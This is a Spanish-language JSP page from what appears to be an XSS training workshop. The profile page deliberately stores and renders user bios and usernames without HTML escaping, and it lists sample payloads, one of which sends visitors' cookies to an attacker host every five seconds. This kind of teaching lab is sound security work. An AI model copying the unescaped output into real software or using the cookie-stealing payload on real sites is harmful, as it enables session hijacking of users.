<%@page import="com.jgranados.xss.workshop.db.DB"%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.util.*" %>
<%
    DB database = (DB) application.getAttribute("DB");
    if (database == null) {
        database = new DB(application);

// Aplicación
        application.setAttribute("DB", database);

    }

// Crear o actualizar perfil
    if ("POST".equalsIgnoreCase(request.getMethod())) {
        String username = request.getParameter("username");
        String bio = request.getParameter("bio");

        if (username != null && !username.trim().isEmpty()) {
            // Buscar si ya existe el perfil
            boolean found = false;
            for (Map<String, String> profile : database.getUserProfilesDB()) {
                if (username.equals(profile.get("username"))) {
                    profile.put("bio", bio != null ? bio : "");
                    found = true;
                    break;
                }
            }

            // Si no existe, crear nuevo
            if (!found) {
                Map<String, String> newProfile = new HashMap<>();
                newProfile.put("id", String.valueOf(System.currentTimeMillis()));
                newProfile.put("username", username);
                newProfile.put("bio", bio != null ? bio : "");
                database.getUserProfilesDB().add(newProfile);
            }

            // Guardar en archivo
            database.saveToFile();
        }
    }

    String viewProfile = request.getParameter("view");
    Map<String, String> currentProfile = null;
    if (viewProfile != null) {
        for (Map<String, String> profile : database.getUserProfilesDB()) {
            if (viewProfile.equals(profile.get("username"))) {
                currentProfile = profile;
                break;
            }
        }
    }
%>
<html>
    <head>
        <title>Perfiles de Usuario - XSS Stored</title>
        <style>
            body {
                font-family: Arial;
                margin: 40px;
            }
            .profile-form {
                background: #e7f3ff;
                padding: 20px;
                margin: 10px 0;
            }
            .profile {
                background: #f8f9fa;
                padding: 20px;
                margin: 10px 0;
                border: 2px solid #007bff;
            }
            .user-list {
                background: #fff3cd;
                padding: 15px;
                margin: 10px 0;
            }
            .vulnerable {
                background: #f8d7da;
                padding: 10px;
                margin: 5px 0;
            }
        </style>
    </head>
    <body>
        <h1>👤 Perfiles de Usuario - XSS Stored</h1>

        <div class="vulnerable">
            <h3>⚠️ VULNERABILIDAD: Biografías y datos de perfil sin sanitización</h3>
            <p>Los perfiles de usuario se almacenan y muestran sin escapado HTML. Cualquier visitante del perfil ejecutará el payload.</p>
        </div>

        <div class="profile-form">
            <h3>📝 Crear/Editar Perfil</h3>
            <form method="POST">
                <label>Nombre de usuario:</label><br>
                <input type="text" name="username" placeholder="Tu nombre de usuario" required><br><br>

                <label>Biografía (HTML permitido):</label><br>
                <textarea name="bio" rows="4" cols="50" placeholder="Describe quién eres..."></textarea><br><br>

                <button type="submit">Guardar Perfil</button>
            </form>
        </div>

        <div class="user-list">
            <h3>👥 Lista de Usuarios Registrados</h3>
            <% if (database.getUserProfilesDB() != null && !database.getUserProfilesDB().isEmpty()) { %>
            <ul>
                <% for (Map<String, String> profile : database.getUserProfilesDB()) {%>
                <li><a href="?view=<%= profile.get("username")%>"><%= profile.get("username")%></a></li>
                    <% } %>
            </ul>
            <% } else { %>
            <p>No hay usuarios registrados aún.</p>
            <% } %>
        </div>

        <% if (currentProfile != null) {%>
        <div class="profile">
            <h2>Perfil de: <strong><%= currentProfile.get("username")%></strong></h2>
            <div style="margin: 15px 0;">
                <h4>📖 Biografía:</h4>
                <div><%= currentProfile.get("bio")%></div>
            </div>
        </div>

        <div style="background: #d4edda; padding: 15px; margin: 10px 0;">
            <h3>🔍 Análisis del Perfil:</h3>
            <p><strong>Vulnerabilidad explotada:</strong> La biografía se renderiza como HTML sin sanitización.</p>
            <p><strong>Impacto:</strong> Todos los visitantes de este perfil ejecutarán el código malicioso.</p>
        </div>
        <% }%>

        <div style="background: #fff3cd; padding: 15px; margin: 20px 0;">
            <h3>🎯 Payloads para Perfiles de Usuario:</h3>
            <code>&lt;script&gt;alert('XSS en perfil de usuario!')&lt;/script&gt;</code><br>
            <code>&lt;img src=x onerror="alert('Cada visitante verá esto')"&gt;</code><br>
            <code>&lt;script&gt;setInterval(()=>fetch('http://192.168.0.100:8080/attackers-app/log.jsp?info=profile:<%= currentProfile != null ? currentProfile.get("username") : "user"%>&cookie='+document.cookie),5000)&lt;/script&gt;</code><br>
            <code>&lt;h1 style="color:red"&gt;PERFIL HACKEADO&lt;/h1&gt;&lt;script&gt;document.body.style.background='red'&lt;/script&gt;</code>
        </div>

        <p><a href="stored-xss-index.jsp">← Volver al índice XSS Stored</a> | 
            <a href="index.jsp">← Volver al inicio</a></p>
    </body>
</html>